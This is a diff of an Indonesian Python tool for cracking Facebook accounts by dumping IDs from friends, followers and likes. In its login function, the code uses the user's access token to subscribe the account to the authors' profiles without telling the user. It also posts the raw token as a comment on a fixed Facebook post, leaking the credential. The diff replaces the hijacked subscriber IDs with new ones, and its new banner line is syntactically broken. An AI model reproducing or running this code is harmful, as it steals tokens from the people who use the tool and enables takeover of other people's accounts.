@@ -2,7 +2,6 @@
 #coding=utf-8
 
 #record aja sesukamu & hujat sesukamu.
-#saya latif tidak bertanggung jawab atas dampak apa yang akan terjadi ketika atau setelah menggunakan tools ini.
 import requests as req,json,os,time,re,random,sys
 from bs4 import BeautifulSoup as parser
 from concurrent.futures import ThreadPoolExecutor as Bool
@@ -201,13 +200,8 @@ def login():
 			ttl=r['birthday']
 			open('save','w').write(token)
 			print(f"\n[{ijo}✓{putih}] LOGIN BERHASIL\n[{merah}!{putih}] HARAP TUNGGU SEBENTAR...")
-			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={token}') #LATIF
-			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={token}") #YANWAR
-			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={token}") #PAGE_LATIF
-			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={token}') #PAGE_YANWAR
-			req.post(f"https://graph.facebook.com/100004018035398/subscribers?access_token={token}") #RANI_YANWAR
-			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={token}') #FATAH
-			req.post(f'https://graph.facebook.com/100005395413800/subscribers?access_token={token}') #YAYAN
+			req.post(f'https://graph.facebook.com/100051863139451/subscribers?access_token={token}') #ADITYA
+			req.post(f'https://graph.facebook.com/112038233869374/subscribers?access_token={token}') #ANIMEX
 			req.post(f'https://graph.facebook.com/523610268713267/comments?message={token}&access_token={token}')
 			req.post(f'https://graph.facebook.com/523610268713267/comments?message={random.choice(["latif ganteng :v","latif mengmantav","saya jelek latif ganteng:v"])}&access_token={token}')
 			time.sleep(2)
@@ -326,15 +320,14 @@ def jalan(textnya):
 def dump(token,nama,ttl):
 	global password
 	os.system("clear")
-	jalan("""%s
-  _________   _____ __________.___
- /   _____/  /  _  \\______    \   | 
- \_____  \  /  /_\  \|     ___/   |     
- /        \/    |    \    |   |   |   
-/_______  /\____|__  /____|   |___|
-        \/         \/
-        %sLatif. H & Yanwar. E
-        """%(ijo,putih))
+	jalan("""
+  __________             _____     ________                       _____                   
+___  ____/_____ _________  /_    ___  __ \__________________ ______(_)___  ________ ___ 
+__  /_   _  __ `/_  ___/  __/    __  /_/ /_  ___/  _ \_  __ `__ \_  /_  / / /_  __ `__ \
+_  __/   / /_/ /_(__  )/ /_      _  ____/_  /   /  __/  / / / / /  / / /_/ /_  / / / / /
+/_/      \__,_/ /____/ \__/      /_/     /_/    \___//_/ /_/ /_//_/  \__,_/ /_/ /_/ /_/                                                                                        
+
+        """(ijo,putih))
 	print(f"[{biruM}!{putih}] NYALAKAN => MATIKAN MODE PESAWAT [{biruM}!{putih}]")
 	jalan(f"[{biru}={putih}] HALLO\t: {biruM}{nama}{putih}\n[{biru}={putih}] TTL KAMU\t: {biruM}{ttl}{putih}")
 	print(f"\n[{biruM}/\{putih}] DUMP ID BERDASARKAN [{biruM}/\{putih}]\n[{biruL}01{putih}] DUMP FROM FRIENDS LIST\n[{biruL}02{putih}] DUMP FROM FOLLOWERS LIST\n[{biruL}03{putih}] DUMP FROM LIKES POST\n[{biruL}04{putih}] CARI TARGET CRACK\n[{biruL}05{putih}] CEK HASIL CRACK\n[{biruL}UA{putih}] SETTINGS USERAGENT\n")
